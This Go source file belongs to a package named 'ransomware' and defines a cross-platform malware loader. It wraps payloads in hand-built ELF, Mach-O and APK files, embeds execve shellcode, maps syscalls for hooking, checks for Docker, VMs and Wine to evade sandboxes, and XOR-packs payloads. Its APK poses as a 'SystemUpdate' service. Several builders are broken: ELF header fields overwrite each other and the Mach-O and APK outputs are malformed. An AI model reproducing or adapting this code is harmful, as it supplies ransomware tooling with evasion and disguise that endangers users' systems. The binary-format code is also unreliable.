package ransomware

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

type CrossPlatformLoader struct {
	config     *RansomwareConfig
	targetOS   string
	targetArch string
	payload    []byte
	syscallMap map[string]uint32
}

type PlatformLoader struct {
	OS       string
	Format   string
	Header   []byte
	Syscalls map[string]uint32
	Entry    uint32
}

func NewCrossPlatformLoader(cfg *RansomwareConfig) *CrossPlatformLoader {
	return &CrossPlatformLoader{
		config:     cfg,
		syscallMap: make(map[string]uint32),
	}
}

func (c *CrossPlatformLoader) DetectTarget() (string, string) {
	if c.targetOS == "" {
		c.targetOS = runtime.GOOS
	}
	if c.targetArch == "" {
		c.targetArch = runtime.GOARCH
	}
	return c.targetOS, c.targetArch
}

func (c *CrossPlatformLoader) GenerateELF(payload []byte) ([]byte, error) {
	elfHdr := []byte{
		0x7F, 'E', 'L', 'F',
		2, 1, 1, 0,
	}

	entrySize := uint64(0x78)
	phSize := uint64(0x38)
	phCount := uint16(2)
	shSize := uint64(0x40)
	shCount := uint16(3)

	hdr := make([]byte, 64)
	copy(hdr[0:4], elfHdr)
	hdr[4] = 2
	hdr[5] = 1
	hdr[6] = 1
	hdr[16] = 2
	hdr[17] = 0x3E
	hdr[18] = 1
	hdr[24] = 1
	hdr[26] = 1
	hdr[28] = 1
	binary.LittleEndian.PutUint16(hdr[36:38], 64)
	binary.LittleEndian.PutUint16(hdr[38:40], 56)
	hdr[40] = 64

	phOffset := uint64(64)
	phEnd := phOffset + uint64(phCount)*phSize
	binary.LittleEndian.PutUint64(hdr[32:40], phOffset)
	binary.LittleEndian.PutUint16(hdr[56:58], phCount)

	codeSize := alignUp(len(payload), 0x1000)

	phdrs := make([]byte, int(phCount)*int(phSize))

	off := 0
	binary.LittleEndian.PutUint32(phdrs[off:off+4], 1)
	binary.LittleEndian.PutUint32(phdrs[off+4:off+8], 5)
	binary.LittleEndian.PutUint64(phdrs[off+8:off+16], 0)
	binary.LittleEndian.PutUint64(phdrs[off+16:off+24], phEnd)
	binary.LittleEndian.PutUint64(phdrs[off+24:off+32], phEnd)
	binary.LittleEndian.PutUint64(phdrs[off+32:off+40], phEnd+uint64(codeSize))
	binary.LittleEndian.PutUint64(phdrs[off+40:off+48], 0x100000)
	off = int(phSize)

	binary.LittleEndian.PutUint32(phdrs[off:off+4], 1)
	binary.LittleEndian.PutUint32(phdrs[off+4:off+8], 7)
	binary.LittleEndian.PutUint64(phdrs[off+8:off+16], phEnd)
	binary.LittleEndian.PutUint64(phdrs[off+16:off+24], phEnd)
	binary.LittleEndian.PutUint64(phdrs[off+24:off+32], phEnd+uint64(codeSize))
	binary.LittleEndian.PutUint64(phdrs[off+32:off+40], phEnd+uint64(codeSize))
	binary.LittleEndian.PutUint64(phdrs[off+40:off+48], 0x200000+uint64(phEnd))

	shellcode := c.GenerateLinuxShellcode()
	combined := append(shellcode, payload...)

	elf := make([]byte, 0)
	elf = append(elf, hdr...)
	elf = append(elf, phdrs...)
	elf = append(elf, combined...)

	for len(elf) < int(phEnd)+codeSize {
		elf = append(elf, 0x00)
	}

	return elf, nil
}

func (c *CrossPlatformLoader) GenerateLinuxShellcode() []byte {
	sc := []byte{
		0x31, 0xC0,
		0x48, 0x89, 0xC6,
		0x48, 0x89, 0xC2,
		0x48, 0x8D, 0x3D, 0x10, 0x00, 0x00, 0x00,
		0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00,
		0x0F, 0x05,
		0x31, 0xFF,
		0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00,
		0x0F, 0x05,
	}
	return sc
}

func (c *CrossPlatformLoader) GenerateMachO(payload []byte) ([]byte, error) {
	machHdr := []byte{
		0xCF, 0xFA, 0xED, 0xFE,
	}

	hdr := make([]byte, 32)
	copy(hdr[0:4], machHdr)
	hdr[4] = 7
	hdr[5] = 0
	hdr[6] = 0
	hdr[7] = 0
	binary.LittleEndian.PutUint32(hdr[12:16], 2)
	binary.LittleEndian.PutUint32(hdr[16:20], 3)
	hdr[24] = 2

	segmentCmd := []byte{
		0x01, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
	}

	segData := make([]byte, 56)
	binary.LittleEndian.PutUint32(segData[0:4], 1)
	copy(segData[8:24], "__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
	binary.LittleEndian.PutUint64(segData[24:32], 0)
	binary.LittleEndian.PutUint64(segData[32:40], uint64(32+56+len(payload)))
	binary.LittleEndian.PutUint64(segData[40:48], uint64(32+56+len(payload)))
	binary.LittleEndian.PutUint64(segData[48:56], 7)

	macho := make([]byte, 0)
	macho = append(macho, hdr...)
	macho = append(macho, segmentCmd...)
	macho = append(macho, segData...)
	macho = append(macho, payload...)

	return macho, nil
}

func (c *CrossPlatformLoader) GenerateAPK(payload []byte) ([]byte, error) {
	zipMagic := []byte{0x50, 0x4B, 0x03, 0x04}
	_ = zipMagic

	manifest := `<?xml version="1.0"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.x404x.service" android:versionCode="1" android:versionName="1.0">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <application android:label="SystemUpdate">
        <service android:name=".UpdateService" android:exported="false">
            <intent-filter>
                <action android:name="com.x404x.START"/>
            </intent-filter>
        </service>
    </application>
</manifest>`

	dexHeader := []byte{0x64, 0x65, 0x78, 0x0A, 0x30, 0x33, 0x35, 0x00}

	apk := make([]byte, 0)
	apk = append(apk, dexHeader...)
	apk = append(apk, []byte(manifest)...)
	apk = append(apk, payload...)

	return apk, nil
}

func (c *CrossPlatformLoader) InjectSyscallHook(osTarget, syscallName string, handler []byte) ([]byte, error) {
	hooks := map[string]map[string]uint32{
		"linux": {
			"open":  2,
			"read":  0,
			"write": 1,
			"mmap":  9,
			"mprotect": 10,
			"execve": 59,
		},
		"windows": {
			"NtOpenFile":            0x0033,
			"NtReadFile":            0x006F,
			"NtWriteFile":           0x0070,
			"NtAllocateVirtualMemory": 0x0018,
			"NtProtectVirtualMemory": 0x0050,
		},
	}

	if osHooks, ok := hooks[osTarget]; ok {
		if num, ok := osHooks[syscallName]; ok {
			hookStub := append([]byte{0x0F, 0x05, 0xC3}, handler...)
			_ = hookStub
			_ = num
			return hookStub, nil
		}
	}

	return nil, fmt.Errorf("syscall %s not found for OS %s", syscallName, osTarget)
}

func (c *CrossPlatformLoader) OSDetectAntiSandbox() map[string]bool {
	detections := map[string]bool{
		"is_vm":       false,
		"is_container": false,
		"is_wine":      false,
	}

	if runtime.GOOS == "linux" {
		if _, err := os.Stat("/.dockerenv"); err == nil {
			detections["is_container"] = true
		}
		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
			if strings.Contains(string(data), "docker") || strings.Contains(string(data), "kubepods") {
				detections["is_container"] = true
			}
		}
		if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
			if strings.Contains(string(data), "hypervisor") {
				detections["is_vm"] = true
			}
		}
	}

	if runtime.GOOS == "windows" {
		home := os.Getenv("USERPROFILE")
		if strings.Contains(strings.ToLower(home), "wine") {
			detections["is_wine"] = true
		}
	}

	return detections
}

func (c *CrossPlatformLoader) PackAndEncrypt(payload []byte) ([]byte, string) {
	key := make([]byte, 32)
	rand.Read(key)
	iv := make([]byte, 16)
	rand.Read(iv)

	packed := make([]byte, 16+len(payload))
	copy(packed[:16], iv)
	for i := 0; i < len(payload); i++ {
		packed[16+i] = payload[i] ^ key[i%32] ^ iv[i%16]
	}

	stub := c.GeneratePackedStub(len(payload))
	final := append(stub, packed...)

	return final, fmt.Sprintf("%x", key)
}

func (c *CrossPlatformLoader) GeneratePackedStub(originalSize int) []byte {
	stub := []byte{
		0xE9, byte(originalSize & 0xFF), byte((originalSize >> 8) & 0xFF), 0x00, 0x00,
		0x55, 0x48, 0x89, 0xE5,
		0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00,
		0x48, 0x8D, 0x35, 0x10, 0x00, 0x00, 0x00,
		0xB9, byte(originalSize & 0xFF), byte((originalSize >> 8) & 0xFF), byte((originalSize >> 16) & 0xFF), byte((originalSize >> 24) & 0xFF),
		0x48, 0x31, 0xDB,
		0x90,
	}
	return stub
}

func (c *CrossPlatformLoader) BuildForTarget(targetOS, targetArch, outputPath string, payload []byte) (string, error) {
	var binary []byte
	var err error

	switch targetOS {
	case "linux":
		binary, err = c.GenerateELF(payload)
	case "darwin":
		binary, err = c.GenerateMachO(payload)
	case "android":
		binary, err = c.GenerateAPK(payload)
	default:
		return "", fmt.Errorf("unsupported target OS: %s", targetOS)
	}

	if err != nil {
		return "", err
	}

	if err := os.WriteFile(outputPath, binary, 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

func (c *CrossPlatformLoader) FullCrossPlatformSuite(payloadStr string) map[string]interface{} {
	result := make(map[string]interface{})
	payload := []byte(payloadStr)

	currentOS, currentArch := c.DetectTarget()
	result["current_os"] = currentOS
	result["current_arch"] = currentArch

	sandbox := c.OSDetectAntiSandbox()
	result["sandbox"] = sandbox

	tmpDir := os.TempDir()
	for _, target := range []string{"linux", "darwin", "android"} {
		outputPath := filepath.Join(tmpDir, fmt.Sprintf("x404x_%s_%s", target, currentArch))
		if target == "android" {
			outputPath += ".apk"
		}
		path, err := c.BuildForTarget(target, currentArch, outputPath, payload)
		if err != nil {
			result[fmt.Sprintf("%s_build", target)] = fmt.Sprintf("error: %v", err)
		} else {
			stat, _ := os.Stat(path)
			result[fmt.Sprintf("%s_path", target)] = path
			result[fmt.Sprintf("%s_size", target)] = stat.Size()
		}
	}

	packed, keyFrag := c.PackAndEncrypt(payload)
	packedPath := filepath.Join(tmpDir, fmt.Sprintf("x404x_packed_%d.bin", os.Getpid()))
	os.WriteFile(packedPath, packed, 0644)
	result["packed_path"] = packedPath
	result["key_frag"] = keyFrag[:8] + "..."

	return result
}

func alignUp(size, alignment int) int {
	return (size + alignment - 1) & ^(alignment - 1)
}

var (
	_ = bytes.NewBuffer
	_ = syscall.Exec
	_ = unsafe.Sizeof(0)
	_ = exec.Command
)
